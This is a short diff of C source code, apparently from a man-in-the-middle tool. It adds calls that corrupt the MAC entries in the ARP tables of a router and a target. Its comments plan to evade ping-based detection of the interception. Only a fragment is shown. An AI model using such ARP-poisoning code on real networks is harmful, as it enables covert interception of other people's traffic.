@@ -9,7 +9,6 @@
 # include <sys/socket.h>
 # include <arpa/inet.h>
 # include <linux/if_packet.h>
-# include <errno.h>
 # include <sys/select.h>
 
 # define MAX(x, y) ((x) > (y) ? (x) : (y))
@@ -35,12 +34,8 @@
 
 ///MAYBE: Is only ping that detect my mitm (but i can bybass it ignoring icmp forward)
 
-///TODO: Corrupt my mac in others ARP tables
 ///TODO: Try to bypass ping command detection
 ///TODO: Test better netcat tcp
-
-
-# define SADDRVALUETO_SADDRIN(x) (*(struct sockaddr_in *)&(x))
 
 __attribute__ ((always_inline))
 static inline err_t handle_broadcast_arp(const struct ethhdr* const eth, proginfo_t *const info,
@@ -155,6 +150,13 @@ static err_t handle_arp_packets(proginfo_t *info, const uint8_t* const router_ma
         //     PRINT_MAC(eth->h_dest, 0);
         //     printf(">)\n");
         // }
+
+        st = corrupt_my_mac_in_router(info);
+        if (st != SUCCESS)
+            goto error;
+        st = corrupt_my_mac_in_target(info);
+        if (st != SUCCESS)
+            goto error;
 
         /* Whether a broadcast is performed the suplanted host will reply too */
         st = handle_broadcast_arp(eth, info, router_mac, target_mac);
